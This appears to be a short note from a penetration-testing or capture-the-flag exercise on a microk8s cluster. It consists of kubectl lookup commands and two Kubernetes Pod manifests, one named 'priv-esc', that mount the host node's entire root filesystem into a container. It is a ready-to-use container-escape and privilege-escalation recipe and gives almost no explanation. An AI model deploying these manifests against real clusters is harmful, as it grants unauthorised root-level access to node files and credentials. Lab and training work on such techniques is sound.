# host.yaml
we need the correct image name, which can be found from  `microk8s.kubectl get deployments -o wide` or

`microk8s.kubectl get node -o yaml`

```text-plain
apiVersion: v1
kind: Pod
metadata:
  name: host
spec:
  containers:
  - image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750
    name: host
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

```text-plain
apiVersion: v1
kind: Pod
metadata:
  name: priv-esc
spec:
  containers:
  - name: shell
    image: localhost:32000/bsnginx
    command:
      - "/bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /mnt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
```